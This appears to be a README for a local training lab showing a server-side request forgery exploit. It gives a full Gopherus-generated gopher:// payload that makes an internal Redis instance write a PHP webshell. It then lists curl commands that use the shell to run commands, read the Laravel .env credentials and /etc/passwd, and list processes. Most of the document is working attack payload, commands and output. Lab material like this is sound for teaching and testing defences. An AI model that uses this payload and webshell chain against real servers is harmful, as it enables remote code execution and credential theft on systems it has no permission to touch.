# SSRF Basic Lab - Simple Proof of Concept

## 🎯 Objective
Exploit SSRF vulnerability to achieve Remote Code Execution on the internal Redis server using Gopher protocol.

---

## 🚀 Quick Start

### 1. Start the Lab
```bash
docker compose up -d
```

### 2. Generate Gopher Payload

Using **Gopherus**:
```bash
python2 gopherus.py --exploit redis
```

**Inputs:**
- What do you want? → `PHPShell`
- Web root location → `/var/www/html/storage/app/public`
- PHP Payload → (Press Enter for default)

**Generated payload** (example):
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2432%0D%0A/var/www/html/storage/app/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

### 3. Modify the Host

Change `127.0.0.1` to `redis`:
```
gopher://redis:6379/_{rest_of_payload}
```

### 4. Send Exploit

```bash
curl -X POST http://localhost:8000/ssrf/basic/check-availability \
  -H "Content-Type: application/json" \
  -d '{"url":"gopher://redis:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2432%0D%0A/var/www/html/storage/app/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A"}'
```

**Success Response:**
```json
{"data":"+OK\r\n+OK\r\n+OK\r\n+OK\r\n+OK\r\n"}
```

✅ **That's it!** The webshell is automatically written to the public directory.

### 5. Access Webshell (Immediately)

```bash
curl -s "http://localhost:8000/storage/shell.php?cmd=id" | strings | grep uid
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:** The response includes Redis binary data. Use `| strings | grep <keyword>` to filter it.

---

## 💻 Execute Commands

**Important:** Filter output to remove Redis binary data. Use specific patterns to extract command output.

```bash
# Get username
curl -s "http://localhost:8000/storage/shell.php?cmd=whoami" | strings | grep -E "^www-data$|^root$"

# Get user info
curl -s "http://localhost:8000/storage/shell.php?cmd=id" | strings | grep "uid="

# List current directory
curl -s "http://localhost:8000/storage/shell.php?cmd=pwd" | strings | grep "^/var"

# List files in web root
curl -s "http://localhost:8000/storage/shell.php?cmd=ls+-la+/var/www/html" | strings | grep -E "^(d|-)rw"

# Read Laravel .env file (credentials)
curl -s "http://localhost:8000/storage/shell.php?cmd=cat+/var/www/html/.env" | strings | grep -E "^(APP_|DB_|REDIS_)"

# Get network interfaces
curl -s "http://localhost:8000/storage/shell.php?cmd=ifconfig" | strings | grep -E "^eth|inet "

# Read /etc/passwd (users)
curl -s "http://localhost:8000/storage/shell.php?cmd=cat+/etc/passwd" | strings | grep -E "^(root|www-data|redis):"

# Check running processes
curl -s "http://localhost:8000/storage/shell.php?cmd=ps+aux" | strings | grep -E "^(USER|www-data|root)" | head -10
```

**Alternative:** Use `tail -1` or `head -1` to get last/first line after filtering:
```bash
# Simple output - just get the result
curl -s "http://localhost:8000/storage/shell.php?cmd=whoami" | strings | tail -1

curl -s "http://localhost:8000/storage/shell.php?cmd=pwd" | strings | tail -1

curl -s "http://localhost:8000/storage/shell.php?cmd=hostname" | strings | tail -1
```

**Lab URL:** http://localhost:8000/ssrf/basic  
**Target Endpoint:** `POST /ssrf/basic/check-availability`  
**Webshell Path:** http://localhost:8000/storage/shell.php?cmd=<command>
